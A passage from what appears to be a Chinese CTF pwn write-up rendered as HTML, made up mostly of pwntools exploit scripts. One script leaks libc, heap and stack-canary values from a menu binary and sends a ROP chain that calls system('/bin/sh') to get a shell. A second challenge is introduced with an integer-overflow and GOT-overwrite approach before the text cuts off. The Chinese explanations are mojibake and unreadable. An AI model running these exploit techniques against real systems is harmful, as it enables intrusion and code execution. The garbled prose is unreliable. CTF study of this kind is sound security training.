p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">canary</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">38</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">binsh</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">ret</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">system</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">repack</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#998418"> len</span><span style="color:#1e754f">(</span><span style="color:#393A34">payload</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><span style="color:#393A34"> payload</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#758575DD">#!/usr/bin/env python3</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> os</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./attachment</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#C99076">BIN</span><span style="color:#666666"> =</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">./attachment</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">libc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">./libc.so.6</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#C99076">HOST</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> os</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">environ</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">get</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">HOST</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#C99076">PORT</span><span style="color:#666666"> =</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">os</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">environ</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">get</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">PORT</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">0</span><span style="color:#C98A7D77">'</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD"># io = remote("60.205.163.215", 36593)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#C99076">BIN</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> """</span><br><span style="color:#C98A7D">    breakrva 0x2a5f</span><br><span style="color:#C98A7D77">    """</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> new</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> n</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Choice:</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">1</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Length</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">n</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Data:</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">''</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">[OK]</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> inspect</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> i</span><span style="color:#CB7676">=</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Choice:</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">2</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Index:</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">i</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> repack</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> i</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> n</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> data</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Choice:</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">4</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Index:</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">i</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Length</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">n</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Data:</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">data</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">[OK]</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#B8A965"> quit</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">7</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> poc_leak</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> spawn</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    new</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1024</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    leak </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> inspect</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">'leak len=</span><span style="color:#4d9375">{</span><span style="color:#B8A965">len</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">leak</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">'</span><span style="color:#5eaab5">)</span><br><span style="color:#B8A965">    quit</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">close</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> poc_heap</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> spawn</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    new</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 10</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    repack</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 22</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">B</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676">*</span><span style="color:#4C9A91">21</span><span style="color:#5eaab5">)</span><br><span style="color:#B8A965">    quit</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">close</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> poc_stack</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> spawn</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    new</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 64</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Choice:</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">4</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Index:</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">0</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Length</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">128</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Data:</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">C</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676">*</span><span style="color:#4C9A91">127</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">close</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    new</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">500</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">inspect</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc_base </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> u64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x0a</span><span style="color:#C98A7D77">'</span><span style="color:#4d9375">)</span><span style="color:#4d9375">[</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">7</span><span style="color:#666666">:</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">]</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">8</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">'</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> -</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">203b20</span><br><br><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    new</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">10</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">inspect</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">heap_leak </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> u64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x0a</span><span style="color:#C98A7D77">'</span><span style="color:#4d9375">)</span><span style="color:#4d9375">[</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">6</span><span style="color:#666666">:</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">]</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">8</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">'</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 12</span><br><span style="color:#DBD7CAEE">repack</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">20</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> *</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">18</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x0a</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x0a</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><span style="color:#758575DD">  # 35CD</span><br><span style="color:#B8A965">print</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">hex</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">heap_leak</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#B8A965">print</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">hex</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">libc_base</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">inspect</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">aaaaaaaaaaaaaaaaaaaaaaaa</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">canary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> u64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x06\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#B8A965">print</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">hex</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">canary</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">pop_rdi_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">000000000010f78b</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">libc_base</span><br><span style="color:#DBD7CAEE">system </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_base </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">system</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">binsh </span><span style="color:#666666">=</span><span style="color:#B8A965"> next</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">search</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/bin/sh</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> libc_base</span><br><span style="color:#DBD7CAEE">ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_base </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">000000000002882f</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">18</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">canary</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">38</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">binsh</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">ret</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">system</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">repack</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#B8A965"> len</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#4d9375">)</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> payload</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<p><del>è„šæœ¬çš„äº¤äº’éƒ¨åˆ†æ˜¯ AI ä¸€æŠŠæ¢­çš„ï¼Œæœ‰ç‚¹ä¸‘</del></p>
<h2 id="ktou" class="scroll-target"><a href="#ktou"><code class="hash inline-code">#</code>ktou</a></h2>
<p>è¿˜ä»¥ä¸ºæ˜¯ kernel pwnï¼Œå…¶å®è¿˜æ˜¯ç”¨æˆ·æ€ã€‚</p>
<p><img src="https://pic1.imgdb.cn/item/690b14f23203f7be00d60d45.png" alt="æ¼æ´ç‚¹"/></p>
<p>è¿™ä¸ªåœ°æ–¹å­˜åœ¨æ•´æ•°æº¢å‡ºï¼Œå¯ä»¥æ‹¿åˆ°ç”¨æˆ·æ€ä»»æ„åœ°å€è¯»å†™çš„åŸè¯­ã€‚</p>
<p>User ç¨‹åº got è¡¨å¯å†™ï¼ŒåŠŸèƒ½ 5 æœ‰ <code class="inline-code">puts(dest)</code>ï¼ŒæŠŠ dest å†™æˆ binshï¼Œputs@got å†™æˆ <code class="inline-code">system</code> å³å¯ã€‚</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#A0ADA0">#!/usr/bin/env python3</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">import</span><span style="color:#393A34"> os</span><br><span style="color:#1E754F">import</span><span style="color:#393A34"> base64</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">terminal </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">tmux</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">splitw</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">-h</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span 